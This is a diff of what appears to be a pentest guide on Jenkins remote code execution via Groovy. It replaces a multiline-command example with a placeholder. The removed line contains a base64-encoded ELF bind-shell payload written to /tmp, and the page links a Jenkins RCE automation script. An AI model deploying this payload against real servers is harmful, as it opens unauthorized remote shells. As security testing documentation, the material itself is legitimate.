@@ -156,10 +156,10 @@ proc.waitForProcessOutput(os, System.err);
 println(os.toString());
 ```
 
-For multiline shell commands, use the following shell syntax trick (example includes bind shell):
+Multiline shell command that can include pipes, redirects and stuff:
 
 ```java
-def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
+def proc = ['bash', '-c', '''your_long_command_here'''].execute();
 ```
 
 Automate it using [this script](./rce/jenkins_rce_admin_script.py).
